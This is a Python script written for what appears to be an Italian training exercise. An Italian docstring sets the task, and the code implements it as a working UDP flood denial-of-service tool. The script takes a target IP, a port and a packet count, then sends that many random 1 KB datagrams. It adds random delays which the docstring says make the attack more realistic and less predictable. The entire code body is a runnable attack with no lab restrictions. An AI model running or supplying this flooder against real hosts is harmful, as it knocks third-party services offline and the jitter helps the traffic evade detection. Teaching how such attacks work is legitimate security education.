"""
L'esercizio di oggi è scrivere un programma in Python che simuli un UDP flood, 
ovvero l'invio massivo di richieste UDP verso una macchina target che è in 
ascolto su una porta UDP casuale (nel nostro caso un DoS.  

Requisiti:
    -Il programma deve richiedere l'inserimento dell'IP target (input)
    -Il programma deve richiedere l'inserimento della porta target (input)
    -La grandezza dei pacchetti da inviare è di 1 KB per pacchetto 
        - Suggerimento: per costruire il pacchetto da 1KB potete utilizzare il modulo 
        «random» per la generazione di byte casuali.
    -Il programma deve chiedere all'utente quanti pacchetti da 1 KB inviare (input)


Estendere l'esercizio implementando un meccanismo di ritardo casuale tra l'invio di 
pacchetti UDP. Questo può rendere l'attacco più realistico e meno prevedibile, 
simulando meglio il comportamento di un numero elevato di utenti che inviano 
richieste al server in modo indipendente. Il ritardo casuale deve essere tra 
0 e 0.1 secondi.
"""

import sys
import socket
import random
import time

if len(sys.argv) != 4:
    print("Usage: python esercizio.py <ip> <porta> <numero_pacchetti>")
    sys.exit(254)

ip    = sys.argv[1]
porta = sys.argv[2]
npack = int(sys.argv[3])


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((ip, int(porta)))

for i in range(npack):
    packet = random.randbytes(1024) 
    s.send(packet)
    print(f"Inviato pacchetto {i + 1}/{npack} a {ip}:{porta}")

    time_casuale = random.randint(0, 100)  
    time_casuale = float(time_casuale) / 1000.0
    print(f"Ritardo casuale di {time_casuale:.2f} secondi prima dell'invio del pacchetto {i + 1}")
    time.sleep(time_casuale) 

s.close()
print("Tutti i pacchetti sono stati inviati.")